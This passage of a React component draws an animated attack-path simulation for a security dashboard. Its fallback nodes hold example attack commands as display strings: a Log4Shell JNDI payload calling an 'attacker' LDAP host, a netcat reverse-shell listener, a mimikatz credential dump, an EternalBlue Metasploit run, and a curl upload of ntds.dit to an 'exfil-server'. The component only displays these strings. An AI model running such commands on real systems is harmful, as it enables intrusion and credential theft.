/* eslint-disable no-unused-vars */
import React, { useState, useEffect, useMemo } from 'react';
import { Shield, Zap, AlertCircle, Loader2, Play, Pause, RotateCcw, Globe, Server, Cpu, Target, ChevronRight, Activity, Command } from 'lucide-react';
import { attackPathService } from '../services/apiClient';
import { motion, AnimatePresence } from 'framer-motion';
import GlobalHeader from '../components/GlobalHeader';

// Helper to resolve icon by node type and label
const getIcon = (type, label) => {
  const lbl = label.toUpperCase();
  if (type === 'Entry' || lbl.includes('GATEWAY')) return Globe;
  if (lbl.includes('FIREWALL')) return Shield;
  if (type === 'Service' || lbl.includes('PORT') || lbl.includes('SUBNET')) return Cpu;
  if (type === 'Vulnerability' || lbl.startsWith('CVE-')) return AlertCircle;
  if (type === 'Objective' || lbl.includes('EXFILTRATED')) return Target;
  return Server;
};

// Helper for risk/severity colors
const getRiskColor = (risk) => {
  switch ((risk || '').toLowerCase()) {
    case 'critical': return '#ff0055';
    case 'high': return '#f97316';
    case 'medium': return '#f59e0b';
    case 'low': return '#00c8ff';
    default: return '#00c8ff';
  }
};

const AttackPathView = ({ headerTitle, headerSubtitle }) => {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selectedNode, setSelectedNode] = useState(null);
  const [isPlaying, setIsPlaying] = useState(false);
  const [activeStep, setActiveStep] = useState(-1);
  const [speed, setSpeed] = useState(2000);

  useEffect(() => {
    let active = true;
    (async () => {
      try {
        const res = await attackPathService.generateGraph();
        if (active) setData(res.data);
      } catch (err) {
        if (active) setError(err.response?.data?.detail || err.message || 'Failed to build attack path.');
      } finally {
        if (active) setLoading(false);
      }
    })();
    return () => { active = false; };
  }, []);

  // Generate 8-stage nodes list from dynamic API data or fallback scenario matching user screenshot
  const nodesList = useMemo(() => {
    if (!data) return null;
    const targetName = data.target || 'MOCK-ENV.LOCAL';
    const topRisks = data.predictive_analysis?.top_risks || [];
    
    // Branch 1 (Active/Compromised upper path)
    const upperRisk = topRisks[0] || {};
    const activeCVE = upperRisk.cve || 'CVE-2021-44228';
    const activePort = upperRisk.port || 80;
    const activeSubnet = '10.0.10.0/24';
    const activeAsset = upperRisk.name || 'ACTIVE DIRECTORY DC';

    // Branch 2 (Inactive/Greyed lower path)
    const lowerRisk = topRisks[1] || {};
    const inactiveCVE = lowerRisk.cve || 'CVE-2017-0144';
    const inactivePort = lowerRisk.port || 445;
    const inactiveSubnet = '10.0.11.0/24';
    const inactiveAsset = lowerRisk.name || 'SECURE SQL DATABASE';

    // Static details mapper if not present in dynamic object
    const findOriginalNode = (stageNum, branch) => {
      if (!data.graph || !data.graph.nodes) return null;
      return data.graph.nodes.find(n => {
        const isCorrectStage = n.stage === stageNum;
        if (!isCorrectStage) return false;
        if (branch === 'upper') {
          return n.id.includes('br0') || n.id === 'attacker_entry' || n.id.startsWith('host_');
        } else {
          return n.id.includes('br1');
        }
      });
    };

    const s0_node = findOriginalNode(0, 'upper') || {};
    const s1_node = findOriginalNode(1, 'upper') || {};
    const s2_node = findOriginalNode(2, 'upper') || {};

    const u3_node = findOriginalNode(1, 'upper') || {};
    const u4_node = findOriginalNode(2, 'upper') || {};
    const u5_node = findOriginalNode(3, 'upper') || {};
    const u6_node = findOriginalNode(5, 'upper') || {};
    const u7_node = findOriginalNode(6, 'upper') || {};

    const l3_node = findOriginalNode(1, 'lower') || {};
    const l4_node = findOriginalNode(2, 'lower') || {};
    const l5_node = findOriginalNode(3, 'lower') || {};
    const l6_node = findOriginalNode(5, 'lower') || {};
    const l7_node = findOriginalNode(6, 'lower') || {};

    return {
      shared: [
        {
          id: 's0',
          label: 'ADVERSARY GATEWAY',
          tag: 'ADVERSARY',
          type: 'Entry',
          active: true,
          color: 'blue',
          detail: s0_node.detail || 'External adversarial gateway simulating penetration vector.',
          tool: s0_node.tool || 'nmap / OSINT',
          command: s0_node.command || 'nmap -sS -Pn -T4 --open 10.10.10.15',
          terminal_output: s0_node.terminal_output || 'Initiated reconnaissance scan...'
        },
        {
          id: 's1',
          label: 'PERIMETER FIREWALL',
          tag: 'HOST BREACHED',
          type: 'Host',
          active: true,
          color: 'red',
          detail: s1_node.detail || 'Primary edge firewall protection bypassed by initial connection.',
          tool: s1_node.tool || 'RouterSploit',
          command: s1_node.command || 'use exploits/routers/bypasses; run',
          terminal_output: s1_node.terminal_output || 'Connection bypassed on edge security layer.'
        },
        {
          id: 's2',
          label: targetName.toUpperCase(),
          tag: 'HOST BREACHED',
          type: 'Host',
          active: true,
          color: 'red',
          detail: s2_node.detail || `Compromised entry host asset: ${targetName}.`,
          tool: s2_node.tool || 'Reverse Shell Listener',
          command: s2_node.command || 'nc -lvnp 4444',
          terminal_output: s2_node.terminal_output || 'Reverse TCP connection established.'
        }
      ],
      upper: [
        {
          id: 'u3',
          label: `PORT ${activePort}`,
          tag: 'EXPOSED PORT',
          type: 'Service',
          active: true,
          color: 'blue',
          detail: u3_node.detail || `Exposed public service listening on port ${activePort}.`,
          tool: u3_node.tool || 'Nmap Banner Grab',
          command: u3_node.command || `nmap -p ${activePort} -sV ${targetName}`,
          terminal_output: u3_node.terminal_output || 'PORT 80/tcp open http Apache/Tomcat'
        },
        {
          id: 'u4',
          label: activeCVE,
          tag: 'EXPLOITED',
          type: 'Vulnerability',
          active: true,
          color: 'orange',
          cvss: u4_node.cvss || 10.0,
          risk: u4_node.risk || 'Critical',
          mitre: u4_node.mitre || 'T1190',
          prob: u4_node.prob || 0.95,
          detail: u4_node.detail || `Remote Code Execution exploit executed: ${activeCVE}.`,
          tool: u4_node.tool || 'JNDI-Exploit-Kit',
          command: u4_node.command || `curl -H 'X-Api-Version: \${jndi:ldap://attacker:1389/a}' http://${targetName}:${activePort}/`,
          terminal_output: u4_node.terminal_output || 'LDAP reference redirection succeeded. Exploit active.'
        },
        {
          id: 'u5',
          label: `SUBNET ${activeSubnet}`,
          tag: 'EXPOSED PORT',
          type: 'Service',
          active: true,
          color: 'blue',
          detail: u5_node.detail || 'Lateral pivoting executed into internal corporate subnet range.',
          tool: u5_node.tool || 'fping',
          command: u5_node.command || 'fping -a -g 10.0.10.0/24',
          terminal_output: u5_node.terminal_output || 'Host detected: 10.0.10.22 (ACTIVE DIRECTORY DC)'
        },
        {
          id: 'u6',
          label: activeAsset.toUpperCase(),
          tag: 'HOST BREACHED',
          type: 'Host',
          active: true,
          color: 'red',
          detail: u6_node.detail || 'Internal Active Directory Domain Controller compromised.',
          tool: u6_node.tool || 'Mimikatz Token Impersonation',
          command: u6_node.command || 'mimikatz.exe "sekurlsa::logonpasswords" exit',
          terminal_output: u6_node.terminal_output || 'Successfully dumped plaintext credentials for domain admin.'
        },
        {
          id: 'u7',
          label: 'DATA EXFILTRATED',
          tag: 'SYSTEM PRIZED',
          type: 'Objective',
          active: true,
          color: 'red',
          detail: u7_node.detail || 'Final objective achieved. Core database records and NTDS.dit exfiltrated.',
          tool: u7_node.tool || 'Exfiltration Webhook',
          command: u7_node.command || 'curl --upload-file /tmp/ntds.dit http://exfil-server/incoming',
          terminal_output: u7_node.terminal_output || 'Transmitted 4.2 GB administrative database package.'
        }
      ],
      lower: [
        {
          id: 'l3',
          label: `PORT ${inactivePort}`,
          tag: 'EXPOSED PORT',
          type: 'Service',
          active: false,
          color: 'grey',
          detail: l3_node.detail || `Exposed port ${inactivePort} scanned but not leveraged in active compromise path.`,
          tool: l3_node.tool || 'Nmap',
          command: l3_node.command || `nmap -p ${inactivePort} ${targetName}`,
          terminal_output: l3_node.terminal_output || 'PORT 445/tcp open microsoft-ds'
        },
        {
          id: 'l4',
          label: inactiveCVE,
          tag: 'EXPLOITED',
          type: 'Vulnerability',
          active: false,
          color: 'grey',
          cvss: l4_node.cvss || 8.1,
          risk: l4_node.risk || 'High',
          mitre: l4_node.mitre || 'T1210',
          prob: l4_node.prob || 0.62,
          detail: l4_node.detail || `Vulnerability ${inactiveCVE} mapped but not leveraged on the primary chain.`,
          tool: l4_node.tool || 'ms17_010_eternalblue',
          command: l4_node.command || `use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS ${targetName}; run`,
          terminal_output: l4_node.terminal_output || 'Exploit thread terminated.'
        },
        {
          id: 'l5',
          label: `SUBNET ${inactiveSubnet}`,
          tag: 'EXPOSED PORT',
          type: 'Service',
          active: false,
          color: 'grey',
          detail: l5_node.detail || 'Secondary backup subnet mapped but remained unused.',
          tool: l5_node.tool || 'Route command',
          command: l5_node.command || 'route print',
          terminal_output: l5_node.terminal_output || 'Route table entries retrieved successfully.'
        },
        {
          id: 'l6',
          label: inactiveAsset.toUpperCase(),
          tag: 'HOST BREACHED',
          type: 'Host',
          active: false,
          color: 'grey',
          detail: l6_node.detail || 'Defensive endpoint security policies blocked active pivots on this database server.',
          tool: l6_node.tool || 'Nmap Service Probe',
          command: l6_node.command || 'nmap -sV 10.0.11.45',
          terminal_output: l6_node.terminal_output || 'Port 3306 open (MySQL - Secured)'
        },
        {
          id: 'l7',
          label: 'DATA EXFILTRATED',
          tag: 'SYSTEM PRIZED',
          type: 'Objective',
          active: false,
          color: 'grey',
          detail: l7_node.detail || 'Target objective reached state is secure on this segment.',
          tool: 'N/A',
          command: 'N/A',
          terminal_output: 'No exfiltration actions recorded.'
        }
      ]
    };
  }, [data]);

  // Layout node coordinates (exactly matching user screenshot spacing)
  const nodePositions = useMemo(() => {
    return {
      // Shared horizontal path
      's0': { x: 8, y: 55 },
      's1': { x: 20, y: 55 },
      's2': { x: 32, y: 55 },
      // Upper branch (Active exploit vector)
      'u3': { x: 44, y: 25 },
      'u4': { x: 56, y: 25 },
      'u5': { x: 68, y: 25 },
      'u6': { x: 80, y: 25 },
      'u7': { x: 92, y: 25 },
      // Lower branch (Locked/secured vector)
      'l3': { x: 44, y: 80 },
      'l4': { x: 56, y: 80 },
      'l5': { x: 68, y: 80 },
      'l6': { x: 80, y: 80 },
      'l7': { x: 92, y: 80 }
    };
  }, []);

  // Ordered list of IDs for simulation sequence
  const orderList = useMemo(() => {
    return ['s0', 's1', 's2', 'u3', 'u4', 'u5', 'u6', 'u7'];
  }, []);

  useEffect(() => {
    let timer;
    if (isPlaying && activeStep < orderList.length - 1) {
      timer = setTimeout(() => {
        const next = activeStep + 1;
        setActiveStep(next);
        // Auto select the newly compromised node in telemetry panel
        const id = orderList[next];
        if (nodesList) {
          const node = nodesList.shared.find(n => n.id === id) || nodesList.upper.find(n => n.id === id);
          if (node) setSelectedNode(node);
        }
      }, speed);
    } else if (activeStep >= orderList.length - 1) {
      setIsPlaying(false);
    }
    return () => clearTimeout(timer);
  }, [isPlaying, activeStep, orderList, speed, nodesList]);

  // Check if a link is illuminated based on current simulation progress
  const isLinkLit = (sourceId, targetId) => {
    const sIdx = orderList.indexOf(sourceId);
    const tIdx = orderList.indexOf(targetId);
    return sIdx !== -1 && tIdx !== -1 && sIdx <= activeStep && tIdx <= activeStep + 1;
  };

  // Check if a node is compromised, active, or pending
  const getNodeStatus = (id) => {
    if (!orderList.includes(id)) return 'locked'; // Lower inactive branch
    const idx = orderList.indexOf(id);
    if (idx === activeStep) return 'active';
    if (idx < activeStep) return 'compromised';
    return 'pending';
  };

  // Bezier curve calculations for S-curves and straight connections
  const getPathD = (x1, y1, x2, y2) => {
    if (y1 === y2) {
      return `M ${x1} ${y1} L ${x2} ${y2}`;
    } else {
      const mx = (x1 + x2) / 2;
      return `M ${x1} ${y1} C ${mx} ${y1}, ${mx} ${y2}, ${x2} ${y2}`;
    }
  };

  const getThemeColorClass = (color, isText = false) => {
    if (color === 'blue') return isText ? 'text-[#00c8ff]' : 'border-[#00c8ff]';
    if (color === 'orange') return isText ? 'text-[#ff9900]' : 'border-[#ff9900]';
    if (color === 'red') return isText ? 'text-[#ff0055]' : 'border-[#ff0055]';
    return isText ? 'text-gray-500' : 'border-white/5';
  };

  if (loading) {
    return (
      <div className="h-full w-full flex flex-col items-center justify-center gap-4 py-20 bg-black">
        <Loader2 className="animate-spin text-[#00c8ff]" size={40} />
        <p className="text-sm font-mono text-gray-500">Mapping visual attack topology...</p>
      </div>
    );
  }

  if (error) {
    return (
      <div className="p-6 bg-red-950/20 border border-red-500/30 rounded-3xl text-red-400 font-mono text-sm max-w-4xl mx-auto my-10">
        [ERROR] {error}
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <GlobalHeader title={headerTitle} subtitle={headerSubtitle} />

      <div className="flex flex-col lg:flex-row gap-6">
        
        {/* Graph Visual Surface */}
        <div className="flex-[3] bg-[#020203] border border-white/10 rounded-[2rem] relative min-h-[600px] overflow-hidden flex flex-col select-none shadow-[0_0_40px_rgba(0,0,0,0.8)]">
          
          <style>{`
            @keyframes line-dash-flow {
              to {
                stroke-dashoffset: -20;
              }
            }
            .animate-line-dash-flow {
              stroke-dasharray: 5, 4;
              animation: line-dash-flow 1.5s linear infinite;
            }
            @keyframes hud-blink {
              50% { opacity: 0.3; }
            }
            .hud-header-blink {
              animation: hud-blink 1.5s step-start infinite;
            }
          `}</style>

          {/* Dotted border guide (External Ingress boundary) */}
          <div className="absolute top-0 bottom-0 left-[38%] border-l border-dashed border-white/10 z-0 pointer-events-none" />
          <span className="absolute top-8 left-[39%] font-mono text-[8px] text-gray-600 tracking-[0.2em] uppercase z-10 pointer-events-none">
            EXTERNAL INGRESS PERIMETER (DMZ) →
          </span>

          {/* Floating UI HUD elements */}
          <div className="absolute top-6 left-6 font-mono text-[8px] text-[#00c8ff] tracking-widest uppercase pointer-events-none z-10">
            <span>HEXASHIELD // ADVERSARY_MAP</span>
          </div>

          {/* SVG Link Connections Layer */}
          <svg className="absolute inset-0 w-full h-full pointer-events-none z-10" viewBox="0 0 100 100" preserveAspectRatio="none">
            {/* Draw links */}
            {(() => {
              const links = [
                // Shared segment
                { s: 's0', t: 's1', active: true, color: 'blue' },
                { s: 's1', t: 's2', active: true, color: 'blue' },
                // Split S-curves
                { s: 's2', t: 'u3', active: true, color: 'blue' },
                { s: 's2', t: 'l3', active: false, color: 'grey' },
                // Upper chain
                { s: 'u3', t: 'u4', active: true, color: 'orange' },
                { s: 'u4', t: 'u5', active: true, color: 'blue' },
                { s: 'u5', t: 'u6', active: true, color: 'red' },
                { s: 'u6', t: 'u7', active: true, color: 'red' },
                // Lower chain
                { s: 'l3', t: 'l4', active: false, color: 'grey' },
                { s: 'l4', t: 'l5', active: false, color: 'grey' },
                { s: 'l5', t: 'l6', active: false, color: 'grey' },
                { s: 'l6', t: 'l7', active: false, color: 'grey' }
              ];

              return links.map((link, idx) => {
                const p1 = nodePositions[link.s];
                const p2 = nodePositions[link.t];
                if (!p1 || !p2) return null;

                const lit = link.active && isLinkLit(link.s, link.t);
                const pathD = getPathD(p1.x, p1.y, p2.x, p2.y);

                // Calculate junction dot midpoints
                const jx = (p1.x + p2.x) / 2;
                const jy = (p1.y + p2.y) / 2;

                // Color mappings
                let strokeColor = 'rgba(255,255,255,0.06)';
                if (lit) {
                  if (link.color === 'blue') strokeColor = '#00c8ff';
                  else if (link.color === 'orange') strokeColor = '#ff9900';
                  else if (link.color === 'red') strokeColor = '#ff0055';
                }

                return (
                  <g key={`link-${idx}`}>
                    {/* Always visible base line */}
                    <path
                      d={pathD}
                      fill="none"
                      stroke={lit ? strokeColor : '#27272a'}
                      strokeWidth={lit ? 1.5 : 1.2}
                      opacity={lit ? 0.2 : 0.8}
                      vectorEffect="non-scaling-stroke"
                    />
                    
                    {/* Glow effect paths */}
                    {lit && (
                      <>
                        <path
                          d={pathD}
                          fill="none"
                          stroke={strokeColor}
                          strokeWidth={3}
                          opacity={0.15}
                          vectorEffect="non-scaling-stroke"
                        />
                        <path
                          d={pathD}
                          fill="none"
                          stroke={strokeColor}
                          strokeWidth={1.5}
                          opacity={0.35}
                          vectorEffect="non-scaling-stroke"
                        />
                      </>
                    )}

                    {/* Core line */}
                    <path
                      id={`path-${link.s}-${link.t}`}
                      d={pathD}
                      fill="none"
                      stroke={lit ? '#ffffff' : '#3f3f46'}
                      strokeWidth={lit ? 0.8 : 1.0}
                      opacity={lit ? 0.9 : 0.7}
                      vectorEffect="non-scaling-stroke"
                    />

                    {/* Dashed flowing line for initial access and key links */}
                    {lit && (link.s === 's0' || link.s === 's1') && (
                      <path
                        d={pathD}
                        fill="none"
                        stroke="#ffffff"
                        strokeWidth={0.8}
                        className="animate-line-dash-flow"
                        vectorEffect="non-scaling-stroke"
                      />
                    )}

                    {/* Flowing particle along path */}
                    {lit && (
                      <g>
                        <circle r="0.4" fill="#ffffff" filter="drop-shadow(0 0 3px #fff)" vectorEffect="non-scaling-stroke">
                          <animateMotion dur="2.4s" repeatCount="indefinite">
                            <mpath href={`#path-${link.s}-${link.t}`} />
                          </animateMotion>
                        </circle>
                      </g>
                    )}

                    {/* Midpoint static junction circles */}
                    <circle
                      cx={jx}
                      cy={jy}
                      r="0.4"
                      fill={lit ? strokeColor : '#09090b'}
                      stroke={lit ? '#ffffff' : '#52525b'}
                      strokeWidth={lit ? 0.6 : 0.8}
                      vectorEffect="non-scaling-stroke"
                    />
                  </g>
                );
              });
            })()}
          </svg>

          {/* Node Render Grid Layer */}
          <div className="absolute inset-0 z-20 pointer-events-auto">
            {nodesList &&
              [...nodesList.shared, ...nodesList.upper, ...nodesList.lower].map((node) => {
                const pos = nodePositions[node.id];
                if (!pos) return null;

                const status = getNodeStatus(node.id);
                const isSelected = selectedNode?.id === node.id;
                const Icon = getIcon(node.type, node.label);

                // Colors resolved
                let bracketColorClass = 'border-white/5';
                let tagColorClass = 'border-white/5 text-gray-500 bg-white/[0.01] opacity-40';
                let cardColor = 'border-white/5 bg-black/40 opacity-20';
                let circleColor = 'border-white/5 bg-white/[0.01] text-gray-600';
                let textClass = 'text-gray-600 opacity-40 border-white/5';

                if (node.active && status !== 'pending') {
                  textClass = 'text-gray-300 border-white/10 bg-black';
                  if (node.color === 'blue') {
                    bracketColorClass = 'border-[#00c8ff]/60';
                    tagColorClass = 'border-[#00c8ff]/25 bg-[#00c8ff]/5 text-[#00c8ff]';
                    cardColor = 'border-white/10 bg-[#070b12]/90 shadow-[0_0_20px_rgba(0,200,255,0.1)]';
                    circleColor = 'border-[#00c8ff]/25 bg-[#00c8ff]/10 text-[#00c8ff]';
                  } else if (node.color === 'orange') {
                    bracketColorClass = 'border-[#ff9900]/60';
                    tagColorClass = 'border-[#ff9900]/25 bg-[#ff9900]/5 text-[#ff9900]';
                    cardColor = 'border-white/10 bg-[#120f07]/90 shadow-[0_0_20px_rgba(255,153,0,0.1)]';
                    circleColor = 'border-[#ff9900]/25 bg-[#ff9900]/10 text-[#ff9900]';
                  } else if (node.color === 'red') {
                    bracketColorClass = 'border-[#ff0055]/60';
                    tagColorClass = 'border-[#ff0055]/25 bg-[#ff0055]/5 text-[#ff0055]';
                    cardColor = 'border-white/10 bg-[#12070b]/90 shadow-[0_0_20px_rgba(255,0,85,0.1)]';
                    circleColor = 'border-[#ff0055]/25 bg-[#ff0055]/10 text-[#ff0055]';
                  }
                }

                return (
                  <motion.div
                    key={node.id}
                    onClick={() => {
                      if (node.active || status !== 'pending') setSelectedNode(node);
                    }}
                    whileHover={node.active ? { scale: 1.04 } : {}}
                    className={`absolute flex flex-col items-center -translate-x-1/2 -translate-y-1/2 select-none 
                      ${node.active ? 'cursor-pointer' : 'cursor-not-allowed'}`}
                    style={{ left: `${pos.x}%`, top: `${pos.y}%` }}
                  >
                    {/* Top status label pill */}
                    <div className={`text-[7px] font-mono font-bold tracking-[0.2em] uppercase px-2 py-0.5 rounded-full border mb-3 transition-all duration-300 ${tagColorClass}`}>
                      {node.tag}
                    </div>

                    {/* Square main container frame */}
                    <div className={`w-16 h-16 rounded-[1rem] relative flex items-center justify-center border transition-all duration-500 ${cardColor}`}>
                      
                      {/* Premium Hud brackets on corners */}
                      <div className={`absolute top-[-2px] left-[-2px] w-2.5 h-2.5 border-t-2 border-l-2 ${bracketColorClass} rounded-tl-sm transition-colors duration-500`} />
                      <div className={`absolute top-[-2px] right-[-2px] w-2.5 h-2.5 border-t-2 border-r-2 ${bracketColorClass} rounded-tr-sm transition-colors duration-500`} />
                      <div className={`absolute bottom-[-2px] left-[-2px] w-2.5 h-2.5 border-b-2 border-l-2 ${bracketColorClass} rounded-bl-sm transition-colors duration-500`} />
                      <div className={`absolute bottom-[-2px] right-[-2px] w-2.5 h-2.5 border-b-2 border-r-2 ${bracketColorClass} rounded-br-sm transition-colors duration-500`} />

                      {/* Inner glowing icon circle */}
                      <div className={`w-11 h-11 rounded-full flex items-center justify-center border relative transition-all duration-500 ${circleColor}`}>
                        
                        {/* Simulation active status radar pulse */}
                        {status === 'active' && (
                          <span className="absolute inset-0 rounded-full animate-ping opacity-25" style={{ backgroundColor: getRiskColor(node.risk || 'low') }} />
                        )}
                        
                        <Icon size={16} />
                      </div>
                    </div>

                    {/* Label card at bottom */}
                    <div className={`mt-3.5 px-3 py-0.5 border rounded text-[8px] font-black font-mono tracking-[0.15em] uppercase text-center whitespace-nowrap transition-all duration-500 ${textClass}`}>
                      {node.label}
                    </div>
                  </motion.div>
                );
              })}
          </div>

          {/* Timeline replay slider progress */}
          {activeStep !== -1 && (
            <div className="w-full h-0.5 bg-white/5 absolute bottom-16 left-0 z-30">
              <div
                className="h-full bg-[#00c8ff] transition-all duration-300 shadow-[0_0_8px_#00c8ff]"
                style={{ width: `${((activeStep + 1) / orderList.length) * 100}%` }}
              />
            </div>
          )}

          {/* Simulation controls bar */}
          <div className="mt-auto bg-[#07070a]/90 border-t border-white/10 p-5 flex items-center gap-4 z-30 backdrop-blur-md relative">
            <div className="flex gap-2">
              <button
                onClick={() => {
                  if (activeStep === -1) setActiveStep(0);
                  setIsPlaying(!isPlaying);
                }}
                className="p-2.5 rounded-xl bg-[#00c8ff] hover:bg-[#00b0df] text-black transition-all active:scale-95 cursor-pointer flex items-center justify-center"
                title={isPlaying ? 'Pause Simulation' : 'Run Vector Simulation'}
              >
                {isPlaying ? <Pause size={16} /> : <Play size={16} />}
              </button>
              <button
                onClick={() => {
                  setIsPlaying(false);
                  setActiveStep(-1);
                  // Clear the telemetry panel completely
                  setSelectedNode(null);
                }}
                className="p-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-gray-400 border border-white/5 cursor-pointer"
                title="Reset Replay"
              >
                <RotateCcw size={16} />
              </button>
            </div>

            <div className="flex-1 font-mono text-[10px] text-gray-400">
              <span className="text-gray-500 font-bold uppercase tracking-wider block text-[8px] mb-0.5">Threat Scenario Simulation</span>
              <p className="line-clamp-1 text-gray-300">
                {data.predictive_analysis?.threat_scenario || 'Vector analyzer ready. Hit play to trace execution chain.'}
              </p>
            </div>

            <div className="flex items-center gap-2">
              <span className="font-mono text-[8px] text-gray-600 uppercase tracking-widest mr-1">SIM_SPEED</span>
              <div className="flex gap-1">
                {[1, 2, 4].map((s) => (
                  <button
                    key={s}
                    onClick={() => setSpeed(2000 / s)}
                    className={`text-[9px] font-mono font-bold px-2 py-0.5 rounded border transition-all cursor-pointer ${
                      speed === 2000 / s ? 'bg-[#00c8ff]/10 border-[#00c8ff] text-[#00c8ff]' : 'border-white/5 text-gray-500 hover:text-gray-300'
                    }`}
                  >
                    {s}x
                  </button>
                ))}
              </div>
            </div>
          </div>

        </div>

        {/* Intelligence Side Telemetry Panel */}
        <div className="flex-1 flex flex-col gap-6 lg:max-w-md">
          <div className="cyber-panel bg-black/40 border border-white/5 p-6 flex flex-col min-h-[480px]">
            <div className="flex justify-between items-center mb-5 border-b border-white/5 pb-3">
              <div>
                <span className="text-[9px] font-mono text-gray-500 tracking-widest block">TELEMETRY DECK</span>
                <h3 className="text-base font-bold text-white tracking-wide">Node Intelligence</h3>
              </div>
              <Shield className="text-[#00c8ff]" size={18} />
            </div>

            <AnimatePresence mode="wait">
              {selectedNode ? (
                <motion.div
                  key={selectedNode.id}
                  initial={{ opacity: 0, y: 8 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -8 }}
                  className="space-y-4 flex-grow flex flex-col"
                >
                  <div className="p-4 rounded-xl bg-white/[0.02] border border-white/10 relative overflow-hidden">
                    <span className="text-[9px] font-mono px-2 py-0.5 rounded border border-[#00c8ff]/30 bg-[#00c8ff]/5 text-[#00c8ff]">
                      {selectedNode.type?.toUpperCase()}
                    </span>
                    <p className="text-base font-bold text-white mt-3 font-mono break-all leading-tight">{selectedNode.label}</p>
                    {selectedNode.detail && <p className="text-xs text-gray-400 mt-2.5 leading-relaxed">{selectedNode.detail}</p>}
                  </div>

                  <div className="p-4 rounded-xl border border-white/5 bg-black/20 space-y-4">
                    {selectedNode.risk && (
                      <div className="flex justify-between items-center text-xs">
                        <span className="text-gray-400 font-medium">Severity</span>
                        <span className="font-bold uppercase" style={{ color: getRiskColor(selectedNode.risk) }}>{selectedNode.risk}</span>
                      </div>
                    )}
                    {selectedNode.cvss != null && (
                      <div className="space-y-1.5">
                        <div className="flex justify-between items-center text-xs">
                          <span className="text-gray-400">CVSS severity score</span>
                          <span className="font-bold text-white font-mono">{Number(selectedNode.cvss).toFixed(1)} / 10.0</span>
                        </div>
                        <div className="w-full h-1 bg-black/40 border border-white/5 rounded-full overflow-hidden">
                          <div
                            className="h-full rounded-full"
                            style={{
                              width: `${selectedNode.cvss * 10}%`,
                              backgroundColor: getRiskColor(selectedNode.risk),
                              boxShadow: `0 0 6px ${getRiskColor(selectedNode.risk)}`
                            }}
                          />
                        </div>
                      </div>
                    )}
                    {selectedNode.prob != null && (
                      <div className="space-y-1.5">
                        <div className="flex justify-between items-center text-xs">
                          <span className="text-gray-400 font-medium">Exploitation Likelihood</span>
                          <span className="font-bold text-yellow-500 font-mono">{Math.round(selectedNode.prob * 100)}%</span>
                        </div>
                        <div className="w-full h-1 bg-black/40 border border-white/5 rounded-full overflow-hidden">
                          <div
                            className="h-full bg-yellow-500 rounded-full"
                            style={{
                              width: `${selectedNode.prob * 100}%`,
                              boxShadow: '0 0 6px #eab308'
                            }}
                          />
                        </div>
                      </div>
                    )}
                    {selectedNode.mitre && (
                      <div className="flex justify-between items-center text-xs">
                        <span className="text-gray-400 font-medium font-mono">MITRE ATT&CK Mapping</span>
                        <span className="font-semibold text-white font-mono">{selectedNode.mitre}</span>
                      </div>
                    )}
                    {selectedNode.tool && (
                      <div className="flex justify-between items-center text-xs">
                        <span className="text-gray-400 font-medium">Tool Employed</span>
                        <span className="font-semibold text-[#00c8ff]">{selectedNode.tool}</span>
                      </div>
                    )}
                  </div>

                  {selectedNode.command && selectedNode.command !== 'N/A' && (
                    <div className="space-y-1">
                      <div className="flex justify-between items-center">
                        <span className="text-[8px] font-mono text-gray-500 uppercase tracking-widest">Execution Command</span>
                        <button
                          onClick={() => navigator.clipboard.writeText(selectedNode.command)}
                          className="text-[9px] font-mono text-[#00c8ff] hover:text-white transition-colors cursor-pointer"
                        >
                          [COPY]
                        </button>
                      </div>
                      <div className="font-mono text-[9px] bg-black/60 p-3 rounded-lg border border-white/5 text-gray-300 break-all select-all font-bold">
                        {selectedNode.command}
                      </div>
                    </div>
                  )}

                  {selectedNode.terminal_output && selectedNode.terminal_output !== 'N/A' && (
                    <div className="space-y-1 flex-grow flex flex-col">
                      <span className="text-[8px] font-mono text-gray-500 uppercase tracking-widest">DIAGNOSTIC FEED</span>
                      <div className="font-mono text-[9px] text-emerald-500/80 bg-black/60 p-3 rounded-lg border border-emerald-500/10 leading-relaxed overflow-x-auto whitespace-pre-wrap max-h-36 overflow-y-auto font-bold flex-grow">
                        <span className="text-white/40">HEXASHIELD_LOG$</span> status: {getNodeStatus(selectedNode.id).toUpperCase()}<br/>
                        <span className="text-white/40">HEXASHIELD_LOG$</span> output_stream:<br/>
                        <span className="text-emerald-400 font-medium">{selectedNode.terminal_output}</span>
                      </div>
                    </div>
                  )}

                  <button
                    onClick={() => setSelectedNode(null)}
                    className="w-full py-2 rounded-lg border border-white/10 hover:border-[#00c8ff] hover:bg-[#00c8ff]/5 text-xs font-mono font-medium text-gray-400 hover:text-white cursor-pointer transition-all active:scale-95 mt-auto"
                  >
                    DISMISS DETAILS
                  </button>
                </motion.div>
              ) : (
                <div className="py-12 flex flex-col items-center text-center opacity-40 justify-center flex-grow">
                  <AlertCircle size={36} className="mb-3 text-gray-500 animate-pulse" />
                  <p className="text-xs text-gray-500 font-mono">SELECT A NODE ON THE MAP TO INSPECT THREAT TELEMETRY.</p>
                </div>
              )}
            </AnimatePresence>
          </div>

          {/* Aggregate Graph Metrics */}
          <div className="cyber-panel bg-black/40 border border-white/5 p-6">
            <div className="border-b border-white/5 pb-2 mb-4">
              <span className="text-[9px] font-mono text-gray-500 tracking-widest block">AGGREGATE GRAPH METRICS</span>
              <h5 className="text-xs font-bold text-gray-300">Path Vulnerability Analysis</h5>
            </div>
            
            <div className="grid grid-cols-2 gap-3 font-mono">
              <div className="p-3 rounded-lg bg-white/5 border border-white/10 flex flex-col gap-1">
                <span className="text-[10px] text-gray-500 font-medium">Attack paths</span>
                <span className="text-sm font-bold text-[#00c8ff]">{data.metrics?.paths ?? 0}</span>
              </div>
              <div className="p-3 rounded-lg bg-white/5 border border-white/10 flex flex-col gap-1">
                <span className="text-[10px] text-gray-500 font-medium">Critical nodes</span>
                <span className="text-sm font-bold text-red-500">{data.metrics?.critical ?? 0}</span>
              </div>
              <div className="p-3 rounded-lg bg-white/5 border border-white/10 flex flex-col gap-1">
                <span className="text-[10px] text-gray-500 font-medium">Max exploit prob</span>
                <span className="text-sm font-bold text-yellow-500">{Math.round((data.metrics?.max_exploit_prob ?? 0) * 100)}%</span>
              </div>
              <div className="p-3 rounded-lg bg-white/5 border border-white/10 flex flex-col gap-1">
                <span className="text-[10px] text-gray-500 font-medium">Exposure</span>
